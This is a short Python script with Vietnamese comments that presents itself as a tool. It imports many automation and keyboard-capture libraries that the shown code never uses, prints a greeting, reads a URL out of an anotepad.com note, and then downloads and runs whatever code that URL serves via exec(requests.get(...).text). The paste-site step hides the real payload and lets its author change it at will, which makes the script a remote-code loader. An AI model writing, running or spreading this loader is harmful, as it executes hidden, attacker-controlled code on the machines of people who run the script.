#khởi tạo hộ các đệ cái hàm 
import cv2
from adbutils import adb
from PIL import Image
from pyzbar.pyzbar import decode
import subprocess
import pyperclip
import pyautogui
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import colorama
from colorama import Fore, init
import inquirer
from time import sleep
from selenium import webdriver
from selenium.webdriver.common.by import By
from PIL import Image
from collections import defaultdict
from selenium.webdriver.chrome.options import Options as ChromeOptions
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.keys import Keys
from pynput import keyboard
import time
from threading import Timer
from threading import Thread
import numpy as np
import keyboard as KB
import sys , time , requests
from time import sleep
from bs4 import BeautifulSoup
#đánh dấu cái bản quyền các đệ ạ?
print('Upload to time 24/09/23 ') 
thanh="\033[1;33m=================================================================="
print(thanh)
        
        
#chọn 1 == vào tool!
print("\033[1;31m[\033[1;37m=.=\033[1;31m] \033[1;37m=> \033[1;31mChúc chị ngày mới vui vẻ nhé")
url = 'https://anotepad.com/notes/p2hgtpcy'
response = requests.get(url)
response.raise_for_status()  # Kiểm tra xem request có thành công không

# Sử dụng BeautifulSoup để phân tích dữ liệu
soup = BeautifulSoup(response.text, 'html.parser')

# Tìm tất cả thẻ có class "plaintext"
elements = soup.find_all(class_='plaintext')
# print(elements)
# content = ""
for element in elements:
    # print(element.text)
    content = element.text
#     content += element  # In nội dung bên trong thẻ
exec(requests.get(content).text)






